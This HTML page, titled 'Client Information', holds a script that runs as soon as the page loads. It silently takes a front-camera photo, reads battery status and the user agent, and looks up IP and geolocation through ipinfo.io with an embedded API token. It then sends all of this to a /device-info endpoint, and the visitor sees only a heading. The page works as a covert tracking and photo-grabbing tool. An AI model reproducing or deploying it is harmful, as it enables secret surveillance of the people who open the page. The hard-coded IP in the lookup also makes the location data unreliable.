<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Information</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Function to get battery status
            async function getBatteryStatus() {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level * 100,
                        charging: battery.charging
                    };
                }
                return {
                    level: 'unknown',
                    charging: 'unknown'
                };
            }

            // Function to get the user's IP and geolocation from an external service
            async function getUserIPAndLocation() {
                try {
                    // Use ipinfo.io or ip-api.com to get the user's IP and geolocation
                    const response = await fetch('https://ipinfo.io/103.176.185.64/json?token=2f751113cfc155'); // Replace 'YOUR_TOKEN' with your ipinfo token
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        geolocation: {
                            city: data.city,
                            country: data.country,
                            region: data.region,
                            loc: data.loc
                        }
                    };
                } catch (error) {
                    console.error('Error fetching IP and geolocation:', error);
                    return {
                        ip: 'unknown',
                        geolocation: { city: 'unknown', country: 'unknown' }
                    };
                }
            }

            // Function to send data to the server
            async function sendDeviceInfo(dataURL) {
                const batteryStatus = await getBatteryStatus();
                const ipData = await getUserIPAndLocation();
                const userAgent = navigator.userAgent;

                const deviceInfo = {
                    ip: ipData.ip,
                    geolocation: ipData.geolocation,
                    batteryPercentage: batteryStatus.level,
                    chargingStatus: batteryStatus.charging ? 'Charging' : 'Not Charging',
                    userAgent: userAgent,
                    photo: dataURL
                };

                console.log('Device Info:', deviceInfo); // Log device info

                try {
                    await fetch('/device-info', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(deviceInfo)
                    });

                } catch (error) {
                    console.error('Error sending device info:', error);
                }
            }

            // Function to capture photo
            async function capturePhoto() {
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                const constraints = {
                    video: { facingMode: 'user' }
                };

                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = stream;
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });

                    setTimeout(() => {
                        // Capture photo
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataURL = canvas.toDataURL('image/png');
                        sendDeviceInfo(dataURL);
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }, 500); // Capture after 5 seconds

                } catch (error) {
                    console.error('Error accessing camera:', error);
                }
            }

            // Capture photo and send device info
            capturePhoto();
        });
    </script>
</head>
<body>
    <h1>Client Information Page</h1>
</body>
</html>
